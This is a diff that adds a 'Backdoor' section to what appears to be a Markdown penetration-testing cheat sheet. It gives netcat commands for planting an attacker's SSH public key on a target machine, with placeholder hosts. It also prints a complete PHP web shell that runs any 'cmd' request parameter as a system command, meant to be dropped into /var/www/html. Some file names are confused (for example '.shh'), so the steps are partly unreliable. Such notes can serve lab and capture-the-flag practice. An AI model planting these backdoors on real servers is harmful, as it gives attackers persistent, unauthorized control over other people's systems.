@@ -206,6 +206,21 @@ chmod +x script.sh
 ```bash
 ./linpeas.sh
 ```
+#### Backdoor
+- SSH backdoor this consiste at generate ssh keygen and put our public key in /home/user/.shh of your target
+- isn't secret
+```bash
+#go in /home/attacker/.shh and generate private and public key
+ssh-keygen -t rsa -b 4096
+chmod 600 id_rsa
+#now transfer id_rsa.pub via netcat or whatever you want in home/target/.ssh and rename file in authorized_key
+nc <target ip> -lvnp <port> > id_rsa.pub #execute on attacker machine
+nc <attacker ip> <port> < authorized_key #execute on target machine
+```
+- Php backdoor copy this in some file in /var/www/html and change cmd because its a common request 
+```php
+<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
+```
 ### 5. escalation privilege WINDOWS
 ## Important tools
 ### Burpsuite
